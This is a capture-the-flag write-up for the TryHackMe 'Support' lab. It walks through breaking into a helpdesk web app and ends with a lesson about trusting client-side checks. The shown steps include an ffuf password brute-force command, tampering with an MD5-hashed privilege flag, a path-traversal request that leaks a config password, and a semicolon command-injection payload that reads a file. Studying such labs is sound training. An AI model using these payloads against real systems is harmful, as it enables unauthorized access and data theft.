# TryHackMe: Support

**Category:** Web Exploitation
**Tooling:** dirsearch, ffuf, Burp Suite
**Techniques:** Password brute forcing, IDOR via client-side parameter tampering (MD5-encoded boolean), local file inclusion (source disclosure), command injection

---

## Overview

An internal "Support Operations Platform" for IT/helpdesk teams, built without security as a priority. The investigation chains together credential brute forcing, a trivially bypassable client-side privilege flag, a source-disclosure LFI revealing a master password, and finally a command injection vulnerability to read a protected file — resulting in full admin access and flag capture.

---

## 2. Investigation

### Q1 — Flag value after logging in as admin

**Step 1 — Recon and password brute force**

Ran dirsearch for web crawling, then used **ffuf** to brute-force the login password for the known email `help@support.thm`:

```bash
ffuf -w /usr/share/wordlists/rockyou.txt -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=help@support.thm&password=FUZZ" \
  -u http://10.128.129.41 -fc 200
```

**Output:**
```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://10.128.129.41
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : email=help@support.thm&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 200
________________________________________________

:: Progress: [40/14344391] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Esnoopy                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 7ms]
```

This isolated a valid password by filtering out the standard 200-status non-match responses.

**Step 2 — Privilege escalation via parameter tampering**

After logging in, noticed an `isIT` parameter present as an MD5 hash representing a boolean:
```
false → 68934a3e9455fa72420237eb05902327
```

Replaced it with the MD5 hash for `true`:
```
true → b326b5062b2f0e69046810717534cb09
```

This granted access as an internal API user.

**Step 3 — Enumerating user data via the internal API**

```
GET /user/1
```

```json
{
    "email": "specialadmin@support.thm",
    "2FA": false,
    "admin": true
}
```

This revealed a high-privilege admin account's email.

**Step 4 — Source disclosure to find the master password**

Exploited a `skin` parameter that allowed path traversal / local file inclusion:
```
http://10.128.129.41/api.php?skin=../config
```

This leaked the application's config file, revealing:
```php
$MASTER_PASSWORD = 'support@110';
```

**Step 5 — Logging in as admin**

The literal string `support@110` didn't work as a password, but stripping the special character (`support110`) succeeded — suggesting the password was being sanitized or transformed before storage/comparison.

**Answer:**
```
THM{I_AM_ADMIN999}
```

---

### Q2 — Content of /home/ubuntu/user.txt

Found a system feature that passed user input unsanitized into a shell command. Using **Burp Suite** to inject a command via a semicolon-separated payload:

```
sys=date; cat /home/ubuntu/users.txt
```

**Answer:**
```
THM{GOT_THE_FLAG001}
```

---

## Key Lesson

This room strings together several distinct, individually-common web flaws into one compromise chain: **weak/brute-forceable credentials**, a **client-controllable privilege flag** (trusting an MD5-hashed boolean sent from the client rather than enforcing authorization server-side — hashing a value doesn't make it trustworthy if the client can just swap in the hash of the value they want), a **path traversal/LFI** exposing application secrets via a `skin=` parameter, and finally **OS command injection** through unsanitized input passed to a shell. Individually each flaw is well-known; the room is a good exercise in recognizing how quickly a handful of medium-severity issues compound into full administrative and OS-level compromise when trust boundaries are enforced client-side instead of server-side.
